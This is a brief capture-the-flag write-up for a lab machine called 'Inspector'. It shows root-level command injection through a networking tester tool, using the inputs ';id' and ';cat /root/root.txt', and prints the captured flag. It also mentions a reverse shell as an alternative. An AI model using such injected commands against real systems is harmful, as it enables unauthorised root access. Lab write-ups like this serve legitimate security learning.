# Inspector (root)

After we complete user, we are given networking tester.

Giving this something like `;id` will return the following:
```
uid=0(root) gid=0(root) groups=0(root)
```

So we can see that we have a simple command injection.


Getting the flag can be done with:

```
;cat /root/root.txt
````

Or something like a reverse shell.


The flag:

```
ctf{my_first_reverse_shell_super1337}
```
